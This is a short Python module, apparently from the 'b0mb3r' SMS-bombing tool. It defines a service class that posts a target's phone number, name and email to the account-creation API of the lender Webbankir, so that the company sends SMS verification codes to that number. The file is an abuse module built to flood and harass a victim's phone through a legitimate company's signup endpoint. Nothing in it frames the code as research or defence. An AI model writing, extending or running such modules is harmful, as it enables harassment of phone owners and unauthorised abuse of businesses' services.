from b0mb3r.services.service import Service


class WEBbankir(Service):
    async def run(self):
        await self.post(
            "https://ng-api.webbankir.com/user/v2/create",
            json={"lastName": name, "firstName": name, "middleName": name, "mobilePhone": phone, "email": email,"smsCode": ""},
        )
